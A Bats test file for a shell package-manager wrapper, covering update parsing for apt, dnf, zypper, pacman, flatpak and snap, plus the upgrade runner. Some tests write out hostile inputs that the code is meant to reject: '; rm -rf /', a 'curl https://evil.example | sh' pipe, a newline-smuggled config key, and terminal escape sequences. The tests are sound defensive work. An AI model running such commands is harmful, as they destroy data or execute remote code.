#!/usr/bin/env bats
# SPDX-FileCopyrightText: 2026 Jay Taylor (https://github.com/otmof-ops/nudge)
# SPDX-License-Identifier: BSD-3-Clause

bats_require_minimum_version 1.5.0
# Tests for lib/pkgmgr.sh — package manager abstraction

setup() {
    TEST_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")" && pwd)"
    PROJECT_DIR="$(dirname "$TEST_DIR")"
    TMPDIR_TEST=$(mktemp -d)
    MOCK_BIN="$TMPDIR_TEST/bin"
    mkdir -p "$MOCK_BIN"

    # Stubs
    log_debug() { :; }
    log_info()  { :; }
    log_warn()  { :; }
    log_error() { :; }

    source "$PROJECT_DIR/lib/output.sh"
    source "$PROJECT_DIR/lib/pkgmgr.sh"
}

teardown() {
    rm -rf "$TMPDIR_TEST"
}

@test "pkgmgr_detect respects PKGMGR_OVERRIDE" {
    PKGMGR_OVERRIDE="dnf"
    pkgmgr_detect
    [[ "$DETECTED_PKGMGR" == "dnf" ]]
}

@test "pkgmgr_detect finds apt" {
    PKGMGR_OVERRIDE=""
    # Mock apt command
    cat > "$MOCK_BIN/apt" << 'EOF'
#!/bin/bash
exit 0
EOF
    chmod +x "$MOCK_BIN/apt"
    mkdir -p "$TMPDIR_TEST/dpkg"

    # We can't easily mock /var/lib/dpkg, so just test the override path
    PKGMGR_OVERRIDE="apt"
    pkgmgr_detect
    [[ "$DETECTED_PKGMGR" == "apt" ]]
}

@test "pkgmgr_build_summary formats correctly" {
    DETECTED_PKGMGR="apt"
    PKG_UPDATES_TOTAL=14
    PKG_UPDATES_SECURITY=3
    PKG_UPDATES_CRITICAL=1
    PKG_UPDATES_FLATPAK=2
    PKG_UPDATES_SNAP=0

    local summary
    summary=$(pkgmgr_build_summary)

    echo "$summary" | grep -q "16 update(s) available"
    echo "$summary" | grep -q "1 CRITICAL"
    echo "$summary" | grep -q "3 SECURITY"
    echo "$summary" | grep -q "2 Flatpak"
}

@test "pkgmgr_build_summary with zero flatpak/snap" {
    DETECTED_PKGMGR="apt"
    PKG_UPDATES_TOTAL=5
    PKG_UPDATES_SECURITY=0
    PKG_UPDATES_CRITICAL=0
    PKG_UPDATES_FLATPAK=0
    PKG_UPDATES_SNAP=0

    local summary
    summary=$(pkgmgr_build_summary)

    echo "$summary" | grep -q "5 update(s) available"
    [[ "$summary" != *"Flatpak"* ]]
}

@test "_classify_priority identifies critical packages" {
    [[ "$(_classify_priority "linux-image-6.1")" == "CRITICAL" ]]
    [[ "$(_classify_priority "openssl")" == "CRITICAL" ]]
    [[ "$(_classify_priority "libc6")" == "CRITICAL" ]]
    [[ "$(_classify_priority "systemd")" == "CRITICAL" ]]
    [[ "$(_classify_priority "sudo")" == "CRITICAL" ]]
}

@test "_classify_priority identifies standard packages" {
    [[ "$(_classify_priority "vim")" == "STANDARD" ]]
    [[ "$(_classify_priority "firefox")" == "STANDARD" ]]
    [[ "$(_classify_priority "git")" == "STANDARD" ]]
}

@test "_classify_priority identifies security packages" {
    [[ "$(_classify_priority "vim" "true")" == "SECURITY" ]]
}

@test "pkgmgr_build_preview handles empty list" {
    PKG_UPDATE_LIST=""
    local preview
    preview=$(pkgmgr_build_preview)
    echo "$preview" | grep -q "no package details"
}

@test "pkgmgr_build_preview truncates long lists" {
    PKG_UPDATE_LIST=""
    for i in $(seq 1 35); do
        PKG_UPDATE_LIST+="pkg-$i|1.0|2.0|STANDARD"$'\n'
    done
    PKG_UPDATE_LIST="${PKG_UPDATE_LIST%$'\n'}"

    local preview
    preview=$(pkgmgr_build_preview 30)
    echo "$preview" | grep -q "and .* more"
}

@test "pkgmgr_build_json_packages produces valid JSON array" {
    PKG_UPDATE_LIST="openssl|3.0.10|3.0.11|CRITICAL
vim|9.0|9.1|STANDARD"

    local json
    json=$(pkgmgr_build_json_packages)

    [[ "$json" == *'"name":"openssl"'* ]]
    [[ "$json" == *'"priority":"CRITICAL"'* ]]
    [[ "$json" == *'"name":"vim"'* ]]
    [[ "$json" == \[* ]]
    [[ "$json" == *"]" ]]
}

@test "flatpak_available returns 1 when disabled" {
    FLATPAK_ENABLED="false"
    run ! flatpak_available
}

@test "snap_available returns 1 when disabled" {
    SNAP_ENABLED="false"
    run ! snap_available
}

@test "pkgmgr_lock_check apt returns 0 when no lock" {
    DETECTED_PKGMGR="apt"
    # Mock fuser and pgrep to find nothing
    fuser() { return 1; }
    pgrep() { return 1; }
    pkgmgr_lock_check
}

@test "pkgmgr_lock_check apt sees a root-held lock through the process list" {
    DETECTED_PKGMGR="apt"
    fuser() { return 1; }
    pgrep() { [[ "$*" == *"apt-get"* ]] && return 0; return 1; }
    run ! pkgmgr_lock_check
}

@test "pkgmgr_lock_check dnf returns 0 when no pid file" {
    DETECTED_PKGMGR="dnf"
    pkgmgr_lock_check
}

@test "pkgmgr_lock_check pacman returns 0 when no lock file" {
    DETECTED_PKGMGR="pacman"
    pkgmgr_lock_check
}

@test "pkgmgr_lock_check zypper returns 0 when no pid file" {
    DETECTED_PKGMGR="zypper"
    pkgmgr_lock_check
}

@test "_build_upgrade_cmd returns apt command for apt" {
    DETECTED_PKGMGR="apt"
    UPDATE_COMMAND="sudo apt update && sudo apt full-upgrade"
    local cmd
    cmd=$(_build_upgrade_cmd)
    [[ "$cmd" == *"apt"* ]]
}

@test "_build_upgrade_cmd returns dnf command for dnf" {
    DETECTED_PKGMGR="dnf"
    local cmd
    cmd=$(_build_upgrade_cmd)
    [[ "$cmd" == *"dnf"* ]]
}

@test "_build_upgrade_cmd returns pacman command for pacman" {
    DETECTED_PKGMGR="pacman"
    local cmd
    cmd=$(_build_upgrade_cmd)
    [[ "$cmd" == *"pacman"* ]]
}

@test "_build_upgrade_cmd returns zypper command for zypper" {
    DETECTED_PKGMGR="zypper"
    local cmd
    cmd=$(_build_upgrade_cmd)
    [[ "$cmd" == *"zypper"* ]]
}

@test "pkgmgr_build_json_packages handles empty list" {
    PKG_UPDATE_LIST=""
    local json
    json=$(pkgmgr_build_json_packages)
    [[ "$json" == "[]" ]]
}

# --- Real-format parsers through mocked tools ---

_write_mock() {
    # _write_mock <name> <script body>
    printf '#!/bin/bash\n%s\n' "$2" > "$MOCK_BIN/$1"
    chmod +x "$MOCK_BIN/$1"
}

@test "apt parser reads name, suite, versions and arch, and flags security suites" {
    _write_mock apt 'cat <<"EOT"
Listing...
libxml2/noble-updates,noble-security 2.9.14+dfsg-1.3ubuntu3.10 amd64 [upgradable from: 2.9.14+dfsg-1.3ubuntu3.9]
libxml2/noble-updates,noble-security 2.9.14+dfsg-1.3ubuntu3.10 i386 [upgradable from: 2.9.14+dfsg-1.3ubuntu3.9]
sudo/noble-updates,noble-security 1.9.15p5-3ubuntu5.24.04.4 amd64 [upgradable from: 1.9.15p5-3ubuntu5.24.04.3]
thermald/noble-updates 2.5.6-2ubuntu0.24.04.6 amd64 [upgradable from: 2.5.6-2ubuntu0.24.04.5]
claude-desktop-unofficial/unknown 2.26454.2-3.3.9 amd64 [upgradable from: 2.7032.0-3.3.0]
EOT'
    PATH="$MOCK_BIN:$PATH"
    DETECTED_PKGMGR="apt"
    pkgmgr_list_updates
    local n
    n=$(printf '%s\n' "$PKG_UPDATE_LIST" | wc -l)
    [[ "$n" -eq 5 ]]
    [[ "$PKG_UPDATE_LIST" == *"libxml2|2.9.14+dfsg-1.3ubuntu3.9|2.9.14+dfsg-1.3ubuntu3.10|SECURITY|amd64|1"* ]]
    [[ "$PKG_UPDATE_LIST" == *"libxml2|2.9.14+dfsg-1.3ubuntu3.9|2.9.14+dfsg-1.3ubuntu3.10|SECURITY|i386|1"* ]]
    [[ "$PKG_UPDATE_LIST" == *"sudo|1.9.15p5-3ubuntu5.24.04.3|1.9.15p5-3ubuntu5.24.04.4|CRITICAL|amd64|1"* ]]
    [[ "$PKG_UPDATE_LIST" == *"thermald|2.5.6-2ubuntu0.24.04.5|2.5.6-2ubuntu0.24.04.6|STANDARD|amd64|0"* ]]
    [[ "$PKG_UPDATE_LIST" == *"claude-desktop-unofficial|2.7032.0-3.3.0|2.26454.2-3.3.9|STANDARD|amd64|0"* ]]
    [[ "$PKG_UPDATES_CRITICAL" -eq 1 ]]
}

@test "apt counts fall back to the list when apt-check is absent" {
    _write_mock apt 'cat <<"EOT"
libxml2/noble-security 2.10 amd64 [upgradable from: 2.9]
sudo/noble-security 1.1 amd64 [upgradable from: 1.0]
thermald/noble-updates 2.1 amd64 [upgradable from: 2.0]
EOT'
    PATH="$MOCK_BIN:$PATH"
    DETECTED_PKGMGR="apt"
    NUDGE_APT_CHECK="$TMPDIR_TEST/no-such-apt-check"
    pkgmgr_count_updates
    [[ "$PKG_UPDATES_TOTAL" -eq 3 ]]
    [[ "$PKG_UPDATES_SECURITY" -eq 2 ]]
}

@test "apt counts use apt-check when present" {
    _write_mock apt-check 'echo "108;64" >&2'
    DETECTED_PKGMGR="apt"
    NUDGE_APT_CHECK="$MOCK_BIN/apt-check"
    pkgmgr_count_updates
    [[ "$PKG_UPDATES_TOTAL" -eq 108 ]]
    [[ "$PKG_UPDATES_SECURITY" -eq 64 ]]
}

@test "dnf parser keeps dots in names and flags security advisories" {
    _write_mock dnf 'case "$*" in
  "check-update -q") printf "python3.12.x86_64    3.12.3-1.fc40    updates\nkernel.x86_64        6.8.9-300.fc40   updates\nvim-enhanced.x86_64  2:9.1.309-1.fc40 updates\n" ;;
  "updateinfo list --security -q") printf "FEDORA-2026-1 Important/Sec. python3.12-3.12.3-1.fc40.x86_64\n" ;;
esac'
    PATH="$MOCK_BIN:$PATH"
    DETECTED_PKGMGR="dnf"
    pkgmgr_list_updates
    [[ "$PKG_UPDATE_LIST" == *"python3.12||3.12.3-1.fc40|SECURITY|x86_64|1"* ]]
    [[ "$PKG_UPDATE_LIST" == *"kernel||6.8.9-300.fc40|CRITICAL|x86_64|0"* ]]
    [[ "$PKG_UPDATE_LIST" == *"vim-enhanced||2:9.1.309-1.fc40|STANDARD|x86_64|0"* ]]
}

@test "zypper parser reads the Name column, not the repository" {
    _write_mock zypper 'cat <<"EOT"
S | Repository       | Name | Current Version | Available Version | Arch
--+------------------+------+-----------------+-------------------+-------
v | Main Update Repo | curl | 8.0.1-1.1       | 8.0.1-2.1         | x86_64
v | Main Update Repo | vim  | 9.0-1.1         | 9.0-2.1           | x86_64
EOT'
    PATH="$MOCK_BIN:$PATH"
    DETECTED_PKGMGR="zypper"
    pkgmgr_list_updates
    [[ "$PKG_UPDATE_LIST" == *"curl|8.0.1-1.1|8.0.1-2.1|CRITICAL|x86_64|0"* ]]
    [[ "$PKG_UPDATE_LIST" == *"vim|9.0-1.1|9.0-2.1|STANDARD|x86_64|0"* ]]
    [[ "$PKG_UPDATE_LIST" != *"Main Update Repo"* ]]
}

@test "pacman parser reads checkupdates lines" {
    _write_mock checkupdates 'printf "linux 6.6.1.arch1-1 -> 6.6.2.arch1-1\nvim 9.0-1 -> 9.1-1\n"'
    PATH="$MOCK_BIN:$PATH"
    DETECTED_PKGMGR="pacman"
    pkgmgr_list_updates
    [[ "$PKG_UPDATE_LIST" == *"linux|6.6.1.arch1-1|6.6.2.arch1-1|CRITICAL||0"* ]]
    [[ "$PKG_UPDATE_LIST" == *"vim|9.0-1|9.1-1|STANDARD||0"* ]]
}

@test "preview lists critical first, then security, then the rest" {
    PKG_UPDATE_LIST="thermald|1|2|STANDARD|amd64|0
libxml2|1|2|SECURITY|amd64|1
openssl|1|2|CRITICAL|amd64|1
alsa|1|2|STANDARD|all|0"
    _PKG_NATIVE_ARCH="amd64"
    local preview
    preview=$(pkgmgr_build_preview 30)
    [[ "$(echo "$preview" | sed -n 1p)" == *"openssl"*"CRITICAL"* ]]
    [[ "$(echo "$preview" | sed -n 2p)" == *"libxml2"*"SECURITY"* ]]
    [[ "$(echo "$preview" | sed -n 3p)" == *"alsa"* ]]
    [[ "$(echo "$preview" | sed -n 4p)" == *"thermald"* ]]
}

@test "preview marks foreign-architecture packages" {
    DETECTED_PKGMGR="apt"
    PKG_UPDATE_LIST="libxml2|1|2|SECURITY|amd64|1
libxml2|1|2|SECURITY|i386|1"
    _PKG_NATIVE_ARCH="amd64"
    local preview
    preview=$(pkgmgr_build_preview 30)
    [[ "$preview" == *"libxml2:i386 (1 → 2)"* ]]
    [[ "$preview" == *"  libxml2 (1 → 2)"* ]]
}

@test "preview accepts the old four-field list format" {
    PKG_UPDATE_LIST="vim|9.0|9.1|STANDARD"
    local preview
    preview=$(pkgmgr_build_preview 30)
    [[ "$preview" == *"vim (9.0 → 9.1)"* ]]
}

@test "json packages carry arch and security" {
    PKG_UPDATE_LIST="openssl|3.0.10|3.0.11|CRITICAL|amd64|1
vim|9.0|9.1|STANDARD|amd64|0"
    local json
    json=$(pkgmgr_build_json_packages)
    [[ "$json" == *'"name":"openssl"'*'"arch":"amd64","security":true'* ]]
    [[ "$json" == *'"name":"vim"'*'"security":false'* ]]
    if command -v jq &>/dev/null; then
        echo "$json" | jq -e 'length == 2' >/dev/null
    fi
}

@test "_classify_priority honours CRITICAL_PACKAGES_EXTRA" {
    CRITICAL_PACKAGES_EXTRA="firefox|nss"
    [[ "$(_classify_priority "firefox")" == "CRITICAL" ]]
    [[ "$(_classify_priority "nss-tools")" == "CRITICAL" ]]
    [[ "$(_classify_priority "vim" "true")" == "SECURITY" ]]
    CRITICAL_PACKAGES_EXTRA=""
}

@test "flatpak_list separates applications from runtimes" {
    _write_mock flatpak 'case "$*" in
  remotes) echo "flathub" ;;
  *--app*) printf "app/org.mozilla.firefox/x86_64/stable\torg.mozilla.firefox\tFirefox\t128.0\n" ;;
  *--runtime*) printf "runtime/org.freedesktop.Platform/x86_64/23.08\torg.freedesktop.Platform\tFreedesktop Platform\t23.08\n" ;;
esac'
    PATH="$MOCK_BIN:$PATH"
    FLATPAK_ENABLED="auto"
    flatpak_count
    [[ "$PKG_UPDATES_FLATPAK" -eq 2 ]]
    [[ "$PKG_FLATPAK_LIST" == *"app|app/org.mozilla.firefox/x86_64/stable|org.mozilla.firefox|Firefox|128.0"* ]]
    [[ "$PKG_FLATPAK_LIST" == *"runtime|runtime/org.freedesktop.Platform/x86_64/23.08|org.freedesktop.Platform|Freedesktop Platform|23.08"* ]]
}

@test "snap_list reads refresh --list and ignores the up-to-date message" {
    _write_mock snap 'printf "Name        Version         Rev   Size    Publisher    Notes\nfirefox     157.0.1-1       9036  275MB   mozilla**    -\n"'
    PATH="$MOCK_BIN:$PATH"
    SNAP_ENABLED="auto"
    snap_count
    [[ "$PKG_UPDATES_SNAP" -eq 1 ]]
    [[ "$PKG_SNAP_LIST" == "firefox|157.0.1-1|9036|275MB|mozilla**" ]]

    _write_mock snap 'echo "All snaps up to date."'
    snap_count
    [[ "$PKG_UPDATES_SNAP" -eq 0 ]]
}

# --- The upgrade session file and status protocol ---

@test "pkgmgr_write_session writes the three lists" {
    NUDGE_STATE_DIR="$TMPDIR_TEST/state"
    DETECTED_PKGMGR="apt"
    _PKG_NATIVE_ARCH="amd64"
    PKG_UPDATE_LIST="vim|9.0|9.1|STANDARD|amd64|0"
    PKG_FLATPAK_LIST="app|app/org.x.Y/x86_64/stable|org.x.Y|Y|1"
    PKG_SNAP_LIST="firefox|1|2|3|pub"
    local sess
    sess=$(pkgmgr_write_session)
    [[ -f "$sess" ]]
    grep -q '^pkgmgr=apt$' "$sess"
    grep -q '^arch=amd64$' "$sess"
    grep -q '^\[system\]$' "$sess"
    grep -q '^vim|9.0|9.1|STANDARD|amd64|0$' "$sess"
    grep -q '^app|app/org.x.Y/x86_64/stable|org.x.Y|Y|1$' "$sess"
    grep -q '^firefox|1|2|3|pub$' "$sess"
}

@test "_pkgmgr_read_status takes the last value of each key" {
    local st="$TMPDIR_TEST/status"
    printf 'system=ok\nselected_system=3\ntotal_system=5\nsystem=failed\nsnap=skipped\ncancelled=0\n' > "$st"
    _pkgmgr_read_status "$st"
    [[ "$_UPG_SYSTEM" == "failed" ]]
    [[ "$_UPG_SELECTED_SYSTEM" -eq 3 ]]
    [[ "$_UPG_TOTAL_SYSTEM" -eq 5 ]]
    [[ "$_UPG_SNAP" == "skipped" ]]
    [[ "$_UPG_CANCELLED" == "0" ]]
}

@test "_runner_valid_target accepts package names and refs and rejects shell words" {
    _runner_valid_target system "libxml2"
    _runner_valid_target system "libxml2:i386"
    _runner_valid_target system "python3.12"
    run ! _runner_valid_target system "; rm -rf /"
    run ! _runner_valid_target system "-flag"
    _runner_valid_target flatpak "app/org.mozilla.firefox/x86_64/stable"
    run ! _runner_valid_target flatpak "app/x y"
    _runner_valid_target snap "snap-store"
    run ! _runner_valid_target snap "Snap Store"
}

@test "_pkgmgr_wait_session returns when the runner reports done" {
    local st="$TMPDIR_TEST/status"
    printf 'pid=%s\ndone=1\n' "$$" > "$st"
    _pkgmgr_wait_session "$st"
}

@test "_pkgmgr_wait_session fails when the runner's process is gone" {
    local st="$TMPDIR_TEST/status"
    printf 'pid=2147483647\n' > "$st"
    run ! _pkgmgr_wait_session "$st"
}

@test "_terminal_path accepts only known, system-installed terminals" {
    # a user-writable shim with a known name is refused
    printf '#!/bin/bash\n' > "$MOCK_BIN/xterm"; chmod +x "$MOCK_BIN/xterm"
    PATH="$MOCK_BIN:$PATH"
    run ! _terminal_path xterm
    run ! _terminal_path log_info
    run ! _terminal_path /bin/true
    TERMINAL_EMULATOR="xterm"
    local t
    t=$(_detect_terminal)
    [[ "$t" != "xterm" ]] || [[ "$(type -P xterm)" != "$MOCK_BIN/xterm" ]]
}

@test "_terminal_path wants a program owned by root, not a read-only shim of the user's" {
    printf '#!/bin/bash\n' > "$MOCK_BIN/konsole"; chmod 0555 "$MOCK_BIN/konsole"
    ln -s /usr/bin/env "$MOCK_BIN/kitty"
    PATH="$MOCK_BIN:$PATH"
    run ! _terminal_path konsole
    [[ "$(_terminal_path kitty)" == "$MOCK_BIN/kitty" ]]
}

@test "the plain preview adds an arch suffix for apt only" {
    DETECTED_PKGMGR="dnf"
    _PKG_NATIVE_ARCH="x86_64"
    PKG_UPDATE_LIST="linux-firmware||20260901-1.fc42|STANDARD|noarch|0"
    run pkgmgr_build_preview
    [[ "$output" == *"linux-firmware"* ]]
    [[ "$output" != *":noarch"* ]]
    DETECTED_PKGMGR="apt"
    _PKG_NATIVE_ARCH="amd64"
    PKG_UPDATE_LIST="libxml2|1|2|STANDARD|i386|0"
    run pkgmgr_build_preview
    [[ "$output" == *"libxml2:i386"* ]]
}

@test "pkgmgr_write_session refuses an unknown scope with the menu" {
    DETECTED_PKGMGR="apt"
    PKG_UPDATE_LIST="vim|1|2|STANDARD|amd64|0"
    PKG_FLATPAK_LIST="" PKG_SNAP_LIST=""
    export NUDGE_STATE_DIR="$TMPDIR_TEST/state"
    local sess
    sess=$(pkgmgr_write_session $'all\npkgmgr=evil')
    grep -qx 'scope=pick' "$sess"
    run ! grep -q 'evil' "$sess"
}

@test "_runner_exec_command runs the grammar as argument vectors, never through a shell" {
    source "$PROJECT_DIR/lib/config.sh"
    cat > "$MOCK_BIN/apt-get" <<'EOF'
#!/bin/bash
printf '%s\n' "$*" >> "$APT_LOG"
EOF
    chmod +x "$MOCK_BIN/apt-get"
    PATH="$MOCK_BIN:$PATH"
    export APT_LOG="$TMPDIR_TEST/apt.log"
    _runner_exec_command "apt-get update && apt-get install --only-upgrade -y vim"
    [[ "$(sed -n 1p "$APT_LOG")" == "update" ]]
    [[ "$(sed -n 2p "$APT_LOG")" == "install --only-upgrade -y vim" ]]
    run ! _runner_exec_command 'apt-get update && curl https://evil.example | sh'
    [[ "$(wc -l < "$APT_LOG")" -eq 2 ]]
}

@test "_build_upgrade_cmd uses the per-manager default unless the user changed UPDATE_COMMAND" {
    source "$PROJECT_DIR/lib/config.sh"
    UPDATE_COMMAND="${CONFIG_DEFAULTS[UPDATE_COMMAND]}"
    DETECTED_PKGMGR="dnf"
    [[ "$(_build_upgrade_cmd)" == "sudo dnf upgrade -y" ]]
    run ! pkgmgr_custom_update_command
    UPDATE_COMMAND="sudo dnf upgrade --refresh -y"
    [[ "$(_build_upgrade_cmd)" == "sudo dnf upgrade --refresh -y" ]]
    pkgmgr_custom_update_command
    DETECTED_PKGMGR="apt"
    UPDATE_COMMAND="${CONFIG_DEFAULTS[UPDATE_COMMAND]}"
    [[ "$(_build_upgrade_cmd)" == "sudo apt update && sudo apt full-upgrade" ]]
}

@test "_pkgmgr_wait_session ignores a status file whose pid is not a nudge runner" {
    local st="$TMPDIR_TEST/status"
    printf 'pid=%s\n' "$$" > "$st"
    run ! _pkgmgr_wait_session "$st"
    printf 'pid=-1\n' > "$st"
    run ! _pkgmgr_wait_session "$st"
}

@test "the runner refuses a session file that is not private" {
    local sess="$TMPDIR_TEST/sess"
    printf 'pkgmgr=apt\narch=amd64\n[system]\n' > "$sess"
    chmod 644 "$sess"
    source "$PROJECT_DIR/lib/select.sh"
    run ! _runner_load_session "$sess"
    chmod 600 "$sess"
    _runner_load_session "$sess"
}

@test "labels lose control characters before they reach the terminal" {
    source "$PROJECT_DIR/lib/select.sh"
    local sess
    sess=$(mktemp "$TMPDIR_TEST/sess.XXXXXX")
    printf 'pkgmgr=apt\narch=amd64\n[system]\nvim|1|2\033[2J\033[1;1HFAKE|STANDARD|amd64|0\n' > "$sess"
    _runner_load_session "$sess"
    [[ "${_SEL_LABEL[0]}" == "vim" ]]
    [[ "${_SEL_INFO[0]}" != *$'\033'* ]]
    [[ "${_SEL_INFO[0]}" == *"FAKE"* ]]
}

@test "pkgmgr_write_session records the scope the dialog chose" {
    DETECTED_PKGMGR="apt"
    PKG_UPDATE_LIST="vim|1|2|STANDARD|amd64|0"
    PKG_FLATPAK_LIST="" PKG_SNAP_LIST=""
    export NUDGE_STATE_DIR="$TMPDIR_TEST/state"
    local sess
    sess=$(pkgmgr_write_session important)
    grep -qx 'scope=important' "$sess"
    sess=$(pkgmgr_write_session)
    grep -qx 'scope=all' "$sess"
}

@test "the runner reads the scope; a session without one means the menu" {
    source "$PROJECT_DIR/lib/select.sh"
    local sess
    sess=$(mktemp "$TMPDIR_TEST/sess.XXXXXX")
    printf 'pkgmgr=apt\narch=amd64\n[system]\nvim|1|2|STANDARD|amd64|0\n' > "$sess"
    _runner_load_session "$sess"
    [[ "$_RUNNER_SCOPE" == "pick" ]]
    printf 'pkgmgr=apt\narch=amd64\nscope=important\n[system]\nvim|1|2|STANDARD|amd64|0\n' > "$sess"
    _runner_load_session "$sess"
    [[ "$_RUNNER_SCOPE" == "important" ]]
    printf 'pkgmgr=apt\narch=amd64\nscope=everything-please\n[system]\nvim|1|2|STANDARD|amd64|0\n' > "$sess"
    _runner_load_session "$sess"
    [[ "$_RUNNER_SCOPE" == "pick" ]]
}

@test "under the important scope only the critical and security names are upgraded" {
    source "$PROJECT_DIR/lib/tui.sh"
    _TUI_NO_COLOR=true _tui_init
    source "$PROJECT_DIR/lib/select.sh"
    _RUNNER_PKGMGR="apt"
    DETECTED_PKGMGR="apt"
    _RUNNER_STATUS="$TMPDIR_TEST/status"
    : > "$_RUNNER_STATUS"
    _runner_run_step() { printf '%s\n' "$*" >> "$TMPDIR_TEST/steps"; return 0; }
    _runner_exec_command() { printf 'FULL %s\n' "$*" >> "$TMPDIR_TEST/steps"; return 0; }
    select_reset
    select_add system critical "linux-image" linux-image
    select_add system security "openssl" openssl
    select_add system standard "vim" vim
    select_apply_scope important
    _runner_apply_system
    grep -q -- '--only-upgrade -- linux-image openssl' "$TMPDIR_TEST/steps"
    run ! grep -q 'FULL' "$TMPDIR_TEST/steps"
    grep -qx 'system=ok' "$_RUNNER_STATUS"
    # every system package selected runs the full upgrade command instead
    : > "$TMPDIR_TEST/steps"
    select_apply_scope all
    _runner_apply_system
    grep -q '^FULL' "$TMPDIR_TEST/steps"
}
